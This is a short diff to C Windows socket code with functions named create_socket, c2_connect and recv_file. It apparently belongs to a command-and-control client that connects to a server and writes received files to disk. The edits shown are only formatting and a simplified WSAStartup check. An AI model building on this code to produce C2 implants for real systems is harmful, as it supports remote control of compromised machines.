@@ -19,8 +19,7 @@ SOCKET create_socket() {
 	WSADATA wsData;
 	WORD ver = MAKEWORD(2, 2);
 
-	int iResult = WSAStartup(ver, &wsData);
-	if (iResult != 0) {
+	if (WSAStartup(ver, &wsData) != 0) {
 		return INVALID_SOCKET;
 	}
 
@@ -55,6 +54,7 @@ int c2_connect(SOCKET connect_socket, const char *host, const int port) {
 inline uint32_t ntohl_conv(char const* num) {
 	uint32_t new;
 	memcpy(&new, num, sizeof(new));
+
 	// Return deserialized bytes.
 	return ntohl(new);
 }
@@ -73,6 +73,7 @@ int recv_file(char *buf, char* filename, SOCKET connect_socket) {
 	// Receive all file bytes/chunks and write to parsed filename.
 	int iResult = 1;
 	long int total = 0;
+
 	while (total != f_size && iResult > 0) {
 		iResult = recv(connect_socket, buf, BUFLEN, 0);
 		fwrite(buf, 1, iResult, fd);
